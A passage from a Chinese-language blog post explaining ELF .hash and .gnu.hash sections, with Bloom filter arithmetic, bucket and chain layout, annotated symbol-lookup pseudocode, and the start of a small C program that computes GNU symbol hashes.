listxattr</span><br><span class="line">  283   8: 00000000003c6f38     8 OBJECT  WEAK   DEFAULT  34 _environ</span><br><span class="line"> 1642   9: 0000000000034e90    69 FUNC    WEAK   DEFAULT  13 isinfl</span><br><span class="line">  166  10: 0000000000115270    90 FUNC    GLOBAL DEFAULT  13 __libc_pthread_init</span><br><span class="line"> 1489  10: 00000000001176b0    19 FUNC    GLOBAL DEFAULT  13 __recv_chk</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;Num列为动态符号表(.dynsym)索引，Buc列为Buckets[]数组索引。我们可以看到有三个符号都与Buckets[0]相关联，这三个符号计算出的Hash值对nBucket求模，结果都是0。我们可以通过以下方法访问到这三个符号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Buckets[0](469) --&gt; Chains[469](949) --&gt; Chains[949](1604)</span><br><span class="line">            |                    |                    |</span><br><span class="line">            ↓                    ↓                    ↓</span><br><span class="line">        dynsym[469]          dynsym[949]          dynsym[1604]</span><br><span class="line">            |                    |                    |</span><br><span class="line">            ↓                    ↓                    ↓</span><br><span class="line">        __mbrtowc            __setmntent            isnanl</span><br></pre></td></tr></table></figure><h4 id="5-2-3-gnu-hash"><a href="#5-2-3-gnu-hash" class="headerlink" title="5.2.3 .gnu.hash"></a>5.2.3 .gnu.hash</h4><p>&emsp;&emsp;GNU哈希表(.gnu.hash)是标准哈希表(.hash)的更有效的替代方案。两者都可以出现在同一个ELF文件中，但现代GNU ELF文件通常只包含GNU哈希表。此节(Section)的节类型是SHT_GNU_HASH，动态节(Dynamic Section)中此节的节标记为DT_GNU_HASH。</p><p><strong><code>主要区别</code></strong>：</p><ul><li>它添加了一个Bloom Filter以加速无效查找(Negative Lookups)。无效查找是常见的情况，因为符号是按顺序在不同的ELF文件中搜索的。</li><li>它在Hash Chain的每个条目中保存哈希值以避免无用的字符串比较。(比较Hash值比比较字符串更快)</li><li>通过避免在哈希表内存中跳转，它对缓存更加友好。</li><li>它使用DJB Hash函数。</li></ul><p>&emsp;&emsp;.gnu.hash节由四个独立的部分组成，顺序如下:</p><blockquote><p><strong><code>Header</code></strong>：一个提供节参数的32位(4字节)字数组。<br><strong><code>Bloom Filter</code></strong>：此Filter用于快速拒绝在对象中不存在的符号的查找请求。<br><strong><code>Hash Buckets</code></strong>：一个拥有nbuckets个32位Hash Bucket的数组。第N个Bucket字的内容为动态符号表(Dynamic Symbol Table)中具有相同(hash % nbuckets == N)的符号项的最低索引。<br><strong><code>Hash Chains(Hash Values)</code></strong>：GNU Hash节的最后一部分包含(dynsymcount - symndx)个32位字，动态符号表(Dynamic Symbol Table)的第二部分中的每个符号对应一个条目。</p></blockquote><p>&emsp;&emsp;.gnu.hash表的结构如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pseudo-C</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">GNU_Hash_Table</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> nBuckets;                      <span class="comment">/* Number of buckets */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> Symndx;                        <span class="comment">/* Index of the first accessible symbol in .dynsym */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> Maskwords;                     <span class="comment">/* Number of elements in the Bloom Filter */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> Shift2;                        <span class="comment">/* Shift count for the Bloom Filter */</span></span><br><span class="line">    uintXX_t Bloom_Filter[Maskwords];       <span class="comment">/* Bloom Filter */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> Buckets[nBuckets];             <span class="comment">/* Buckets */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> Chains[dynsymCount - Symndx];  <span class="comment">/* Hash Chains(Hash Values) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;Header、Bloom Filter、Buckets和Chains始终是32位字，而Bloom Filter可以是32位或64位字，具体取决于ELF对象的类别。这意味着ELFCLASS32类型的.gnu.hash节仅包含32位字，因此将它们的节头中的sh_entsize字段设置为4。ELFCLASS64类型的.gnu.hash节既包含32位字，也包含64位字，因此将sh_entsize设置为0。</p><p>&emsp;&emsp;假设.gnu.hash节已正确对齐以访问ELFCLASS大小的字，则在Bloom Filter之前紧接着的32位字(4个)确保了Filter Mask字始终正确对齐并可直接在内存中访问。</p><h5 id="5-2-3-1-Dynamic-Section-Requirements-8"><a href="#5-2-3-1-Dynamic-Section-Requirements-8" class="headerlink" title="5.2.3.1 Dynamic Section Requirements[^8]"></a>5.2.3.1 Dynamic Section Requirements[^8]</h5><p>&emsp;&emsp;GNU Hash节(.gnu.hash)对动态符号表(Dynamic Symbol Table)的内容设置了一些额外的排序要求。这与标准SVR4 Hash节(.hash)形成了对比，后者允许符号按<a href="https://blogs.oracle.com/solaris/post/inside-elf-symbol-tables" target="_blank" rel="noopener">ELF标准允许的任何顺序</a>排列。</p><p>&emsp;&emsp;一个标准的SVR4哈希表(.hash)包含动态符号表(Dynamic Symbol Table)中的所有符号。然而，其中一些符号永远不会通过.gnu.hash中查找到：</p><ul><li>本地符号(LOCAL Symbols)：除非被重定位引用(在某些架构上)</li><li>文件符号(FILE Symbols)</li><li>对于共享对象(Sharable Objects)：所有UNDEF符号</li><li>对于可执行文件(Executables)：任何未被PLT引用的UNDEF符号</li><li>特殊索引0对应的符号(UNDEF的一种特殊情况)</li></ul><blockquote><p>&emsp;&emsp;上面所说都是针对.gnu.hash节的，我经过测试libc6_2.23-0ubuntu11.2_amd64的libc-2.23-64.so(我重命名了)中的符号“_rtld_global”是UNDEF的，但是可以在.hash表中找到其在动态符号表(Dynamic Symbol Table)中的索引。</p></blockquote><p>&emsp;&emsp;从哈希表节(Hash Table Section)省略这些符号不会影响正确性，并且会导致更少的哈希表拥塞(Congestion)、更短的哈希链(Chains)以及相应地更好的哈希性能。</p><p>&emsp;&emsp;使用GNU哈希(.gnu.hash)，动态符号表(Dynamic Symbol Table)被分为两部分。第一部分接收可以从哈希表(.hash)中省略的符号。GNU哈希(.gnu.hash)不会对动态符号表(Dynamic Symbol Table)的这一部分中的符号强加任何特定的顺序。</p><p>&emsp;&emsp;动态符号表(Dynamic Symbol Table)的后半部分接收可从.gnu.hash访问的符号。这些符号需要使用上述GNU Hash函数进行升序排序(hash % nBuckets)。Hash Buckets的数量(nBuckets)记录在GNU Hash节中，如下所述。因此，在单个哈希链(Hash Chain)中找到的符号的符号表项和Chains[]数组元素在内存中都是相邻的，从而获得更好的缓存性能。</p><h5 id="5-2-3-2-Header"><a href="#5-2-3-2-Header" class="headerlink" title="5.2.3.2 Header"></a>5.2.3.2 Header</h5><p>&emsp;&emsp;Header中包含4个32位字的节参数：</p><ul><li><strong><code>nBuckets</code></strong>：Buckets[]中元素的数量。根据动态链接符号的数量来获得(最小值为2)。<br></li><li><strong><code>Symndx</code></strong>：动态符号表(.dynsym)具有dynsymCount个符号，Symndx是动态符号表(.dynsym)中可通过.gnu.hash表访问的第一个符号的索引。这意味着可通过.gnu.hash表访问(dynsymCount - Symndx)个符号。<br></li><li><strong><code>Maskwords</code></strong>：.gnu.hash节中Bloom Filter部分中ELFCLASS大小的掩码字(Mask Word)的数量。该值必须为非0，并且必须是2的幂，如下所述。请注意，值0可以解释为.gnu.hash中不存在Bloom Filter。然而，GNU链接器(GNU linkers)不会这样做 —— .gnu.hash节总是包含至少1个掩码字(Mask Word)。<br></li><li><strong><code>Shift2</code></strong>：用于Bloom Filter产生第二个Hash函数的移位计数。细节见下方。</li></ul><p><code>参考</code>：binutils/bfd/elflink.c有具体细节，bfd_elf_size_dynsym_hash_dynstr()。</p><h5 id="5-2-3-3-Bloom-Filter"><a href="#5-2-3-3-Bloom-Filter" class="headerlink" title="5.2.3.3 Bloom Filter"></a>5.2.3.3 Bloom Filter</h5><p>&emsp;&emsp;GNU Hash节包括一个Bloom Filter。Bloom Filter是概率性的(Probabilistic)，这意味着可能会出现误报(False Positives)，但不会出现漏报(False Negatives)(换句话说，就是通过Bloom Filter的不一定在Hash表中，但不通过的一定不在Hash表中)。此Bloom Filter用于快速拒绝在对象中不存在的符号的查找请求，从而避免更耗时的哈希查找操作。通常，一个进程中只有一个对象具有给定的符号。跳过对所有其他对象的哈希操作可以大大加快符号查找速度。</p><p>&emsp;&emsp;Bloom Filter由Maskwords个掩码字(Mask Word)组成，每个字是32位(ELFCLASS32)或64位(ELFCLASS64)，具体取决于ELF对象的类别。在下面的讨论中，C将用于代表一个掩码字(Mask Word)的大小(以bit为单位)。掩码字(Mask Word)共同组成一个拥有(C * Maskwords)个位的逻辑位掩码(Logical Bitmask)。</p><p>&emsp;&emsp;GNU Hash使用k=2的Bloom Filter，这意味着每个符号使用两个独立的Hash函数。Bloom Filter参考包含以下语句：</p><blockquote><p>&emsp;&emsp;对于较大的k，不需要设计k个不同的独立Hash函数。对于具有宽输出的良好Hash函数，此类Hash的不同位域(bit-fields)之间应该几乎没有相关性，因此这种类型的Hash可用于通过将其输出切片为多个位域(bit-fields)来生成多个“不同”的Hash函数。</p></blockquote><p>&emsp;&emsp;GNU Hash所使用的Hash函数具有此属性。利用这一事实，可以从上面描述的单个Hash函数中产生Bloom Filter所需的两个Hash函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">H1 = dl_new_hash(name);</span><br><span class="line">H2 = H1 &gt;&gt; shift2;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如上所述，链接器(Link Editor)确定要使用多少个掩码字(Maskwords个)，以及第一个Hash结果右移以产生第二个Hash结果的移位数(Shift2)。使用的掩码字(Mask Word)越多，Hash节越大，但误报率(False Positives)越低。我在私人电子邮件中被告知，GNU链接器(GNU Linker)首先从输入到哈希表(Hash Table)中的符号数(dynsymCount - Symndx)的以2为底的对数得到Shift2，对于ELFCLASS32的最小值为5，对于ELFCLASS64的最小值为6。这些值明确记录在哈希节(Hash Section)中，以便链接器(Link Editor)在将来出现更好的启发式方法时可以灵活地更改它们。</p><p>&emsp;&emsp;Bloom Filter掩码为两个Hash值分别设置一位。根据<a href="https://en.wikipedia.org/wiki/Bloom_filter" target="_blank" rel="noopener">Bloom Filter参考</a>，要设置的bit所在的掩码字(Mask Word)和要设置的具体bit将按如下计算方法计算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N1 = ((H1 / C) % Maskwords);    <span class="comment">// 要设置的bit所在的掩码字(Mask Word)</span></span><br><span class="line">N2 = ((H2 / C) % Maskwords);</span><br><span class="line"></span><br><span class="line">B1 = H1 % C;                    <span class="comment">// 要设置的具体bit</span></span><br><span class="line">B2 = H2 % C;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在构建Filter时设置位：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bloom[N1] |= (<span class="number">1</span> &lt;&lt; B1);</span><br><span class="line">Bloom[N2] |= (<span class="number">1</span> &lt;&lt; B2);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;然后对Filter进行测试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Bloom[N1] &amp; (<span class="number">1</span> &lt;&lt; B1)) &amp;&amp; (Bloom[N2] &amp; (<span class="number">1</span> &lt;&lt; B2))</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;GNU Hash与上述内容有很大的不同。不是分别计算N1和N2，而是使用单个掩码字(Mask Word)，对应于上面的N1。这是GNU Hash开发人员为优化缓存行为而做出的合理的(Conscious)决定：</p><blockquote><p>&emsp;&emsp;这使得Bloom Filter的2个Hash函数比使用两个不同的N时更加依赖，但在我们的测试中，拒绝应该被拒绝的查找的比率仍然非常好，并且对缓存更加友好。在查找期间尽可能少地接触缓存行(Cache Lines)是非常重要的。</p></blockquote><p>&emsp;&emsp;因此，在GNU Hash中，单个掩码字(Mask Word)实际上通过如下方式进行计算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N = ((H1 / C) % Maskwords);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;设置Bloom Filter掩码字N中的两个位的方式如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BITMASK = (<span class="number">1</span> &lt;&lt; (H1 % C)) | (<span class="number">1</span> &lt;&lt; (H2 % C));</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;链接器(Link-Editor)设置这些位的方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bloom[N] |= BITMASK;</span><br></pre></td></tr></table></figure><h6 id="5-2-3-3-1-Bit-Fiddling-为何maskwords应为2的幂"><a href="#5-2-3-3-1-Bit-Fiddling-为何maskwords应为2的幂" class="headerlink" title="5.2.3.3.1 Bit Fiddling: 为何maskwords应为2的幂"></a>5.2.3.3.1 Bit Fiddling: 为何maskwords应为2的幂</h6><p>&emsp;&emsp;通常，Bloom Filter可以使用任意数量的字(Words)来构造。但是，如上所述，GNU Hash要求Maskwords是2的幂(Maskwords只有1位为1)。这个要求允许下面的取模操作写成一个简单的掩码操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N = ((H1 / C) % Maskwords);</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">N = ((H1 / C) &amp; (Maskwords - <span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;注意(Maskwords - 1)可以预先计算一次，然后用于每一个Hash：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MASKWORDS_BITMASK = Maskwords - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">N = ((H1 / C) &amp; MASKWORDS_BITMASK);</span><br></pre></td></tr></table></figure><h6 id="5-2-3-3-2-Bloom-Filter特殊情况"><a href="#5-2-3-3-2-Bloom-Filter特殊情况" class="headerlink" title="5.2.3.3.2 Bloom Filter特殊情况"></a>5.2.3.3.2 Bloom Filter特殊情况</h6><p>&emsp;&emsp;Bloom Filter有两个有趣的特殊情况：</p><ul><li>当Bloom Filter的所有位都设置时，所有测试都会产生一个True值(接受符号查找请求)。GNU链接器(GNU Linker)利用这一点，当它想要“禁用”Bloom Filter时，.gnu.hash节包含一个所有位都设置的1个掩码字(Mask Word)的Bloom Filter。Bloom Filter仍然存在，并且仍在使用，开销最小，但它让一切都通过。</li><li>掩码字(Mask Word)中的任何一位都没有设置的Bloom Filter在所有情况下都将返回False。这种情况在ELF文件中比较少见，因为不导出符号的对象的应用有限。然而，有时对象是以这种方式构建的，其依赖于.init/.fini节来运行来自对象的代码。</li></ul><h5 id="5-2-3-4-Buckets"><a href="#5-2-3-4-Buckets" class="headerlink" title="5.2.3.4 Buckets[]"></a>5.2.3.4 Buckets[]</h5><p>&emsp;&emsp;Bloom Filter之后是nBuckets个32位字。第N个字的内容为动态符号表(Dynamic Symbol Table)中具有相同(hash % nBuckets)结果的符号项的最低索引，其中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(dl_new_hash(symname) % nBuckets) == N</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由于动态符号表(Dynamic Symbol Table)按相同的键(hash % nBuckets)排序，因此dynsym[Buckets[N]]是包含所需符号(如果存在)的Hash Chain的第一个符号。</p><p>&emsp;&emsp;如果Hash Table中没有给定值N的符号，则Bucket[]数组元素将包含索引0。由于dynsym的索引0是保留值，该索引不会出现在有效符号中，因此是没有歧义的。</p><h5 id="5-2-3-5-Chains"><a href="#5-2-3-5-Chains" class="headerlink" title="5.2.3.5 Chains[]"></a>5.2.3.5 Chains[]</h5><p>&emsp;&emsp;GNU Hash节的最后一部分Chains[]包含(dynsymCount - Symndx)个32位字，动态符号表(Dynamic Symbol Table)的第二部分中的每个符号对应一个Chains[]条目。每个字的高31位包含相应符号Hash的高31位。最低有效位用作停止位。当一个符号是给定Hash Chain中的最后一个符号时，它被设置为1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsb = (N == dynsymCount - <span class="number">1</span>) ||</span><br><span class="line">      ((dl_new_hash(name[N]) % nBuckets) != (dl_new_hash(name[N + <span class="number">1</span>]) % nBuckets))</span><br><span class="line"></span><br><span class="line">hashval = (dl_new_hash(name) &amp; ~<span class="number">1</span>) | lsb;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由于Chains[]的元素中保存符号的Hash值，此节也被称作Values[]。</p><h5 id="5-2-3-6-使用-gnu-hash节查找符号"><a href="#5-2-3-6-使用-gnu-hash节查找符号" class="headerlink" title="5.2.3.6 使用.gnu.hash节查找符号"></a>5.2.3.6 使用.gnu.hash节查找符号</h5><p>&emsp;&emsp;下面显示了如何使用.gnu.hash节在对象中查找符号。我们将假设存在包含所需信息的内存记录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>      *os_dynstr;      <span class="comment">/* Dynamic string table */</span></span><br><span class="line">    Sym             *os_dynsym;      <span class="comment">/* Dynamic symbol table */</span></span><br><span class="line">    Word            os_nbuckets;     <span class="comment">/* The number of hash buckets */</span></span><br><span class="line">    Word            os_symndx;       <span class="comment">/* Index of 1st dynsym in hash */</span></span><br><span class="line">    Word            os_maskwords_bm; <span class="comment">/* The number of Bloom filter words, minus 1 */</span></span><br><span class="line">    Word            os_shift2;       <span class="comment">/* Bloom filter hash shift */</span></span><br><span class="line">    <span class="keyword">const</span> BloomWord *os_bloom;       <span class="comment">/* Bloom filter words */</span></span><br><span class="line">    <span class="keyword">const</span> Word      *os_buckets;     <span class="comment">/* Hash buckets */</span></span><br><span class="line">    <span class="keyword">const</span> Word      *os_hashval;     <span class="comment">/* Hash value array */</span></span><br><span class="line">&#125; <span class="keyword">obj_state_t</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;为了简化问题，我们省略了处理不同ELFCLASS的细节。在上面，Word是一个32位无符号值，BloomWord是32位还是64位取决于ELFCLASS，而Sym是Elf32_Sym或Elf64_Sym。</p><p>&emsp;&emsp;给定一个包含上述对象信息的变量，以下伪代码返回一个指向所需符号的符号表项的指针(如果该符号存在于对象中)，否则返回NULL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Sym *<span class="title">symhash</span><span class="params">(<span class="keyword">obj_state_t</span> *os, <span class="keyword">const</span> <span class="keyword">char</span> *symname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Word            c;</span><br><span class="line">    Word            h1, h2;</span><br><span class="line">    Word            n;</span><br><span class="line">    Word            bitmask; </span><br><span class="line">    <span class="keyword">const</span> Sym       *sym;</span><br><span class="line">    Word            *hashval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Hash the name, generate the "second" hash from it for the Bloom filter.</span></span><br><span class="line"><span class="comment">    * 对符号名求Hash,然后以其为基础为Bloom Filter计算第2个Hash.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    h1 = dl_new_hash(symname);</span><br><span class="line">    h2 = h1 &gt;&gt; os-&gt;os_shift2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Test against the Bloom filter */</span></span><br><span class="line">    <span class="comment">/* 验证Bloom Filter */</span></span><br><span class="line">    c = <span class="keyword">sizeof</span>(BloomWord) * <span class="number">8</span>;                      <span class="comment">// 一个掩码字(Mask Word)包含的掩码位(Mask bit)的个数</span></span><br><span class="line">    n = (h1 / c) &amp; os-&gt;os_maskwords_bm;             <span class="comment">// 求出要验证的掩码字在os_bloom[]中的索引</span></span><br><span class="line">    bitmask = (<span class="number">1</span> &lt;&lt; (h1 % c)) | (<span class="number">1</span> &lt;&lt; (h2 % c));    <span class="comment">// 求出本次要验证的掩码字中的位组成的位掩码</span></span><br><span class="line">    <span class="keyword">if</span> ((os-&gt;os_bloom[n] &amp; bitmask) != bitmask)     <span class="comment">// 本次要验证的掩码字中的位并未设置，说明要查找的符号不能通过该对象的.gnu.hash节找到</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Locate the hash chain, and corresponding hash value element */</span></span><br><span class="line">    <span class="comment">/* 定位Chains[]/hashval[]的位置，以及相应的Chains[]/hashval[]的元素 */</span></span><br><span class="line">    n = os-&gt;os_buckets[h1 % os-&gt;os_nbuckets];       <span class="comment">// 得到os_buckets[]中相应元素中存储的符号表索引/Chains[]索引</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)                                     <span class="comment">// 符号不存在</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line">    sym = &amp;os-&gt;os_dynsym[n];                        <span class="comment">// 符号可能存在，获取指向与待查找符号具有相同(h1 % os-&gt;os_nbuckets)值的最小索引的符号项的指针</span></span><br><span class="line">    hashval = &amp;os-&gt;os_hashval[n - os-&gt;os_symndx];   <span class="comment">// 获取指向相应Chain在Chains[]中的首元素的指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Walk the chain until the symbol is found or the chain is exhausted.</span></span><br><span class="line"><span class="comment">    * 遍历Chain，直到符号被找到，或到Chain结尾了</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (h1 &amp;= ~<span class="number">1</span>; <span class="number">1</span>; sym++) &#123;</span><br><span class="line">        h2 = *hashval++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Compare the strings to verify match. Note that a given hash chain can contain different hash values. </span></span><br><span class="line"><span class="comment">        * 比较字符串，以验证是否匹配。请注意，给定的Hash Chain可以包含不同的Hash值。</span></span><br><span class="line"><span class="comment">        * </span></span><br><span class="line"><span class="comment">        * We'd get the right result by comparing every string, but comparing the hash values first lets us</span></span><br><span class="line"><span class="comment">        * screen obvious mismatches at very low cost and avoid the relatively expensive string compare.</span></span><br><span class="line"><span class="comment">        * 通过比较每个字符串，我们会得到正确的结果，但是首先比较Hash值可以让我们以非常低的成本明显的筛选出不匹配的情况，</span></span><br><span class="line"><span class="comment">        * 并避免相对耗时的字符串比较。</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * We are intentionally glossing over some things here:</span></span><br><span class="line"><span class="comment">        * 这里我们有意地忽略了一些东西:</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * - We could test sym-&gt;st_name for 0, which indicates a NULL string, and avoid a strcmp() in that case.</span></span><br><span class="line"><span class="comment">        * - 我们可以测试sym-&gt;st_name是否为0，这表示NULL字符串，并在这种情况下避免使用strcmp()。</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * - The real runtime linker must also take symbol versioning into account. This is an orthogonal</span></span><br><span class="line"><span class="comment">        *   issue to hashing, and is left out of this example for simplicity.</span></span><br><span class="line"><span class="comment">        * - 真正的运行时链接器还必须考虑符号版本。这是Hash的一个正交问题，为了简单起见，本示例中省略了此问题。</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * A real implementation might test (h1 == (h2 &amp; ~1), and then call a (possibly inline) function to validate the rest.</span></span><br><span class="line"><span class="comment">        * 一个真正的实现可能会验证[h1 == (h2 &amp; ~1)]，然后调用一个(可能是内联的)函数来验证其余的条件。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> ((h1 == (h2 &amp; ~<span class="number">1</span>)) &amp;&amp;                                <span class="comment">// 所查找符号的Hash值是否与当前Chains[]元素中存储的Hash值相等</span></span><br><span class="line">            !<span class="built_in">strcmp</span>(symname, os-&gt;os_dynstr + sym-&gt;st_name))     <span class="comment">// 比较待查找符号字符串与当前符号项对应的字符串</span></span><br><span class="line">                <span class="keyword">return</span> (sym);                                   <span class="comment">// 找到了，返回响应符号项的指针</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Done if at end of chain */</span></span><br><span class="line">        <span class="comment">/* 如果已经到了Chain的结尾，则退出。 */</span></span><br><span class="line">        <span class="keyword">if</span> (h2 &amp; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This object does not have the desired symbol */</span></span><br><span class="line">    <span class="comment">/* 此对象没有所需的符号。 */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="5-2-3-7-符号查找实例"><a href="#5-2-3-7-符号查找实例" class="headerlink" title="5.2.3.7 符号查找实例"></a>5.2.3.7 符号查找实例</h5><p>&emsp;&emsp;首先我们写一个计算符号名Hash的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc gnu_hash.c -o gnu_hash</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> dl_new_hash(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> h = <span class="number">5381</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span> c = *s; c != <span class="string">'\0'</span>; c = *++s)</span><br><span class="line">        h = h * <span class="number">33</span> + c;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%X\n"</span>, dl_new_hash(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 